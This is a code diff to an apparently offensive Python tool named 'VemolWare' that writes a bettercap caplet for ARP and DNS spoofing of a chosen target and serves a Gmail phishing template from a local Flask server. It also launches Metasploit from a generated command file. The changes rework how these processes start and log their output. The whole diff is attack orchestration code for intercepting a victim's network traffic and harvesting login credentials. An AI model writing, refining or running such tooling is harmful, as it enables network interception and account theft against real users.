@@ -1,4 +1,5 @@
 import os
+import subprocess
 import sys
 import netifaces
 from optparse import OptionParser
@@ -50,6 +51,7 @@ class VemolWare:
     def create_config_file_bettercap(self):
         file = open('config/config_bettercap.txt','w') 
         file.write(f'set arp.spoof.targets {self.options.target}\n')
+        file.write('net.probe on\n')
         file.write('set arp.spoof.internal true\n')
         file.write('arp.spoof on\n')
         file.write(f'set dns.spoof.address {LOCAL_IP}\n')
@@ -58,21 +60,19 @@ class VemolWare:
         file.write('dns.spoof on\n')
         file.close()
 
-    def check_requirements(self):
-        pass
-        # os.system('gnome-terminal -- ping 8.8.8.8')
-
     def bettercap(self):
         # Setting up Bettercap
-        command = f'gnome-terminal -- bettercap --caplet config/config_bettercap.txt'
-        os.system(command)
+        command = ["bettercap", "--caplet", "config/config_bettercap.txt"]
+        with open("log_bettercap.txt", "w") as file:
+            subprocess.Popen(command, stdout=file)
     
     def flask_server (self):
         # Starting Flask server targeting domain address
         gmail_template = DOMAIN_TARGET.get('1')[1]
         if 'gmail' in self.option_domain:
-            command = f'gnome-terminal -- python3 app.py {gmail_template}'
-        os.system(command)
+            command = ["python3", "app.py", gmail_template]
+        with open("log_flask.txt", "w") as file:
+            subprocess.Popen(command, stdout=file)
     
     def create_config_file_metasploit(self):
         file = open('config/commands_msf.txt','w')
@@ -88,7 +88,7 @@ class VemolWare:
         file.close()
 
     def start_metasploit(self):
-        # Starting MSFConsole
+        # Starting MSFConsole netstat -natp
         self.create_config_file_metasploit()
         command = f'gnome-terminal -- msfconsole -r config/commands_msf.txt'
         os.system(command)
